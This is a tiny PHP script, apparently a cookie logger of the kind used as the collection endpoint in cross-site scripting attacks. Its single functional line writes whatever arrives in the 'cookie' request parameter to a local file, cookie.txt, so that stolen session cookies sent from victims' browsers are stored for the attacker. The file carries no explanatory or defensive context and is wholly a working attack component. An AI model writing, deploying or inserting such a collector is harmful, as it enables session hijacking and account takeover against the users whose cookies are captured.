<?php
file_put_contents('cookie.txt',$_GET['cookie']);


